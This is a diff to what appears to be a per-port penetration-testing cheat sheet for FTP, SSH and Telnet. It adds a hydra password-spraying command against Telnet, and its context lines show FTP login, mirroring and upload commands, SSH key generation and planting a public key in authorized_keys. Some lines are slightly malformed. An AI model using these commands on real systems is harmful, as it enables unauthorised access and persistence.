@@ -399,7 +399,7 @@ nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
 curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt
 
-+---------- Manual Login ----------+
++---------- Login to Service ----------+
 ftp '$USERNAME'@"$TARGET"
 anonymous
 ls -a
@@ -434,10 +434,10 @@ ssh-keygen -t ed25519 -f id_ed25519 -N ''; chmod 600 id_ed25519 id_ed25519.pub; 
 ssh-keygen -t rsa -f id_rsa -N ''; chmod 600 id_rsa id_rsa.pub; cat id_rsa.pub
 ssh-keygen -t dsa -f id_dsa -N ''; chmod 600 id_dsa id_dsa.pub; cat id_dsa.pub
 
-+---------- Add Public Key Pair to Authorized Keys ----------+
++---------- Add Public Key to Authorized Keys ----------+
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDAS3I0GV78pbzK7Kd3m44tFBbqX1sXRpCv6LPjle3yW root@hostname' > TARGET > ~/.ssh/authorized_keys
 
-+---------- Log In With Private Key Pair----------+
++---------- Login to Service ----------+
 $USERNAME@$TARGET -i id_ed25519 -oHostKeyAlgorithms=+ssh-ed25519 -oPubkeyAcceptedKeyTypes=+ssh-ed25519
 $USERNAME@$TARGET -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa
 $USERNAME@$TARGET -i id_dsa -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedKeyTypes=+ssh-dss
@@ -448,6 +448,10 @@ ssh $USERNAME@$TARGET -i id_rsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
 ssh $USERNAME@$TARGET -i id_dsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
 
 [*] (23) Telnet
++---------- Spray Service ----------+
+hydra -I telnet://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+
++---------- Login to Service ----------+
 telnet --user '$USERNAME' $TARGET
 
 [*] (25) SMTP
